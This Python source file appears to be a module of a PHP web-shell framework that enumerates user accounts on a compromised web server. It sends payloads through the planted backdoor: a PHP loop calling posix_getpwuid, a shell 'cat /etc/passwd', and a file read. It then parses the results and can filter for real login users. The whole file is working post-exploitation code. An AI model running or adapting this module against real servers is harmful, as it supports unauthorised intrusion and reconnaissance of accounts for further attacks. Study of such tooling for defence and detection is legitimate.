'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P

classname = 'EtcPasswd'
    
    
class User:
    
    def __init__(self,line):
           
        linesplit = line.split(':')
        
        self.line = line
        self.name = linesplit[0]
        self.home = '/home/' + self.name
            
        
        if len(linesplit) > 6:
             self.uid = int(linesplit[2])
             self.home = linesplit[5]
             self.shell = linesplit[6]
    
class EtcPasswd(Module):
    """Enumerate users and /etc/passwd content"""
    
    
    vectors = VectorList([
        V('shell.php', 'posix_getpwuid', "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }"),
        V('shell.sh', 'cat', "cat %s"),
        V('file.read', 'fileread', "%s")
        ])
    

    params = ParametersList('Enumerate users in /etc/passwd content', vectors,
                    P(arg='filter', help='Try to show real users only', default=False, type=bool, pos=0))

    
    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}
        
                
    def run_module(self, filter_real_users):
        
        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
                
        for vector in vectors:
            response = self.__execute_payload(vector, [filter_real_users])
            if response != None:
                return response


        raise ModuleException(self.name,  "Users enumeration failed")
                        

    def __execute_payload(self, vector, parameters):
        
        filter_real_users = parameters[0]
        
        payload = self.__prepare_payload(vector, [])
    
        response = self.modhandler.load(vector.interpreter).run({0 : payload})
            
        pwdfile = ''
            
        if response:
            
            response_splitted = response.split('\n')
            
            if response_splitted and response_splitted[0].count(':') >= 6:
                
                self.params.set_and_check_parameters({'vector' : vector.name})
                
                for line in response_splitted:
                    if line:
                        
                        user = User(line)
                        
                        if filter_real_users:
                            if (user.uid == 0) or (user.uid > 999) or (('false' not in user.shell) and ('/home/' in user.home)):
                                pwdfile += line + '\n'
                                self.usersinfo[user.name]=user
                        else:
                                pwdfile += line + '\n'
                                self.usersinfo[user.name]=user
                
                        
                
                
                return pwdfile

        
    def __prepare_payload( self, vector, parameters):

        if vector.payloads[0].count( '%s' ) == 1:
            return vector.payloads[0] % ('/etc/passwd')
        else:
            return vector.payloads[0] 


    
    
    